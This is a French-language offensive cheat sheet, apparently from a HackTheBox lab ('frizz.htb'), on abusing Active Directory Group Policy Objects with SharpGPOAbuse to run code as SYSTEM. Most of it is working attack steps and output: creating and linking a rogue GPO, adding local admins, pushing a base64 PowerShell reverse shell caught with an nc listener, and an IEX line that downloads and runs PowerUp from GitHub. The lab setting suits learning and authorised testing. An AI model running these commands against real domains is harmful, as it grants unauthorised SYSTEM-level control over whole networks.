# GPO Abuse

### <mark style="color:blue;">GPO Abuse - SharpGPOAbuse 🎭</mark>

#### <mark style="color:green;">Description</mark>

Exploitation des **Group Policy Objects (GPO)** pour obtenir l'exécution de code en tant que **SYSTEM** sur des machines du domaine.

***

#### <mark style="color:green;">Qu'est-ce qu'une GPO ? 📚</mark>

Une **GPO** (Group Policy Object) = Ensemble de règles/configurations qui s'appliquent automatiquement aux machines et utilisateurs d'un domaine AD.

**Exemples** :

* Installer des logiciels
* Configurer des paramètres de sécurité
* Créer des tâches planifiées
* Monter des lecteurs réseau

**Stockage** :

```
\\domain.htb\SYSVOL\domain.htb\Policies\{GPO-GUID}\
├── Machine\              ← Paramètres machines
│   └── Preferences\
│       └── ScheduledTasks\
│           └── ScheduledTasks.xml
└── User\                 ← Paramètres utilisateurs
```

***

#### <mark style="color:green;">Identification de la vulnérabilité 🔍</mark>

**Vérifier les groupes de l'utilisateur**

```powershell
# Groupes de l'utilisateur actuel
net user username

# Groupes avec whoami
whoami /groups
```

**Chercher** :

* `Group Policy Creator Owners` ← Peut créer/modifier des GPO
* Groupes personnalisés avec accès GPO

**Vérifier les permissions sur les GPO**

```powershell
# Lister toutes les GPO
Get-GPO -All

# Vérifier les permissions sur une GPO spécifique
Get-GPPermission -Name "Default Domain Policy" -All
```

**Avec BloodHound**

```cypher
MATCH p=(u:User)-[:GenericWrite|GenericAll|WriteOwner|WriteDacl]->(g:GPO)
RETURN p
```

***

#### <mark style="color:green;">Exploitation avec SharpGPOAbuse 🛠️</mark>

**Téléchargement**

```bash
# SharpCollection (précompilé)
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpGPOAbuse.exe

# Ou depuis le repo officiel
git clone https://github.com/FSecureLABS/SharpGPOAbuse
```

**Upload sur la cible**

```powershell
# Via Evil-WinRM
upload SharpGPOAbuse.exe

# Via SCP
scp -k SharpGPOAbuse.exe user@dc.domain.htb:/windows/temp/
```

***

#### <mark style="color:green;">Cas 1 : Modifier une GPO existante</mark>

**Lister les GPO existantes**

```powershell
Get-GPO -All | Select-Object DisplayName, Id, Owner
```

**Problème** : Les GPO par défaut appartiennent à `Domain Admins` **Solution** : Créer une nouvelle GPO

***

#### Cas 2 : Créer une nouvelle GPO (RECOMMANDÉ) ✅

**Étape 1 : Créer la GPO**

```powershell
New-GPO -name "EvilGPO"
```

**Sortie** :

```
DisplayName      : EvilGPO
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus     ← Tu es propriétaire !
Id               : 551ab862-1897-42aa-a274-f95bdb262b3f
GpoStatus        : AllSettingsEnabled
CreationTime     : 3/12/2025 1:02:20 AM
```

**Étape 2 : Lier la GPO au domaine**

```powershell
# Lier à tout le domaine
New-GPLink -Name "EvilGPO" -Target "DC=frizz,DC=htb"

# Ou à une OU spécifique
New-GPLink -Name "EvilGPO" -Target "OU=Computers,DC=frizz,DC=htb"
```

**Sortie** :

```
GpoId       : 551ab862-1897-42aa-a274-f95bdb262b3f
DisplayName : EvilGPO
Enabled     : True
Target      : DC=frizz,DC=htb
Order       : 2
```

***

#### <mark style="color:green;">Types d'attaques avec SharpGPOAbuse 🎯</mark>

**1. Ajouter un utilisateur aux administrateurs locaux**

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount username --GPOName "EvilGPO"
```

**Ce qui se passe** :

* L'utilisateur devient admin local sur toutes les machines où la GPO s'applique
* Permet de se connecter avec des droits élevés

***

**2. Créer une tâche immédiate (Immediate Task) ⭐**

```powershell
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName "TaskName" `
  --Author "DOMAIN\username" `
  --Command "cmd.exe" `
  --Arguments "/c whoami > C:\output.txt" `
  --GPOName "EvilGPO"
```

**Paramètres** :

* `--TaskName` : Nom de la tâche
* `--Author` : Auteur (n'importe qui)
* `--Command` : Binaire à exécuter
* `--Arguments` : Arguments de la commande
* `--GPOName` : Nom de la GPO à modifier

**Important** : La tâche s'exécute en tant que **NT AUTHORITY\SYSTEM** !

***

**3. Exécution de commande (POC)**

```powershell
# Test simple
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName "Test" `
  --Author "0xdf" `
  --Command "powershell.exe" `
  --Arguments "whoami > C:\Users\m.schoolbus\test.txt" `
  --GPOName "EvilGPO"

# Forcer la mise à jour GPO
gpupdate /force

# Vérifier le résultat
cat C:\Users\m.schoolbus\test.txt
# Output : nt authority\system
```

***

**4. Reverse Shell 🐚**

```powershell
# 1. Générer un reverse shell PowerShell (base64)
# Via revshells.com → PowerShell #3 (Base64)
# Copier le payload encodé

# 2. Créer une nouvelle GPO
New-GPO -name "RevShell"
New-GPLink -Name "RevShell" -Target "DC=frizz,DC=htb"

# 3. Ajouter la tâche malveillante
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName "Shell" `
  --Author "0xdf" `
  --Command "powershell.exe" `
  --Arguments "-e BASE64_ENCODED_PAYLOAD" `
  --GPOName "RevShell"

# 4. Forcer la mise à jour
gpupdate /force
```

**Sur ta machine Kali** :

```bash
# Listener
rlwrap -cAr nc -lnvp 443

# Connexion reçue en tant que SYSTEM
Connection received on 10.10.11.60 59805
whoami
# nt authority\system
```

***

#### <mark style="color:green;">Propagation des GPO ⏱️</mark>

**Automatique**

Les machines mettent à jour leurs GPO :

* **Toutes les 90 minutes** (par défaut)
* **+ délai aléatoire de 0-30 minutes**

**Manuel**

```powershell
# Sur la machine cible (si tu as accès)
gpupdate /force

# À distance (avec WinRM)
Invoke-Command -ComputerName TARGET-PC -ScriptBlock { gpupdate /force }
```

***

#### Fichiers créés par SharpGPOAbuse 📁

```
\\domain.htb\SYSVOL\domain.htb\Policies\{GPO-GUID}\
└── Machine\
    └── Preferences\
        └── ScheduledTasks\
            └── ScheduledTasks.xml  ← Fichier créé
```

**Contenu de ScheduledTasks.xml** :

```xml
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" 
                     name="TaskName" 
                     changed="2024-01-01 00:00:00" 
                     uid="{GUID}">
        <Properties action="C" 
                    name="TaskName" 
                    runAs="NT AUTHORITY\System" 
                    logonType="S4U">
            <Task version="1.2">
                <Actions>
                    <Exec>
                        <Command>powershell.exe</Command>
                        <Arguments>-e BASE64_PAYLOAD</Arguments>
                    </Exec>
                </Actions>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```

**Important** : `runAs="NT AUTHORITY\System"` → Exécution en SYSTEM !

***

#### <mark style="color:green;">Nettoyage 🧹</mark>

**Supprimer la GPO**

```powershell
# Délier d'abord
Remove-GPLink -Name "EvilGPO" -Target "DC=frizz,DC=htb"

# Puis supprimer
Remove-GPO -Name "EvilGPO"
```

**Sur HTB/CTF**

Les machines ont souvent un script de nettoyage qui tourne toutes les 2-5 minutes. **Solution** : Créer une nouvelle GPO à chaque tentative.

***

#### <mark style="color:green;">Alternatives à SharpGPOAbuse 🔄</mark>

**1. PowerView (PowerUp.ps1)**

```powershell
# Charger PowerUp
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Utiliser New-GPOImmediateTask
New-GPOImmediateTask -Verbose -Force `
  -TaskName 'TaskName' `
  -GPODisplayName 'GPOName' `
  -Command cmd `
  -CommandArguments "/c whoami > C:\output.txt"
```

**2. Modification manuelle (SYSVOL)**

```powershell
# Trouver le GUID de la GPO
Get-GPO -Name "EvilGPO" | Select-Object Id

# Accéder au dossier SYSVOL
cd \\domain.htb\SYSVOL\domain.htb\Policies\{GUID}\Machine\Preferences\ScheduledTasks\

# Créer/modifier ScheduledTasks.xml manuellement
notepad ScheduledTasks.xml

# Incrémenter la version de la GPO
$gptIni = Get-Content "\\domain.htb\SYSVOL\domain.htb\Policies\{GUID}\GPT.INI"
$version = [int]($gptIni | Select-String "Version=").Line.Replace("Version=", "")
$newVersion = $version + 1
$gptIni -replace "Version=$version", "Version=$newVersion" | Set-Content "\\...\GPT.INI"
```

***

***
